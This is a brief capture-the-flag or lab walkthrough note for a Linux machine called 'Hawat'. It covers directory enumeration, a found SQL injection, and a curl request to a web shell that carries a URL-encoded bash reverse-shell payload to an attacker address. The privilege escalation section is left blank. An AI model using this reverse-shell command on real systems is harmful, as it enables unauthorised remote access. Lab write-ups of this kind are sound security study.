# Hawat (Linux)

## Initial Foothold

Three interconnected HTTP services discovered. Used `gobuster` for full directory enumeration. Searched files for the keyword "פינצה" and identified a SQL injection vulnerability ([see notes](obsidian://open?vault=Obsidian%20Vault&file=SQLi)).  
Obtained a reverse shell with:
```bash
curl "http://192.168.158.147:30455/cmd.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.237%2F443%200%3E%261"
```

## Privilege Escalation

(Not specified in the walkthrough. If you have more info, add here.)
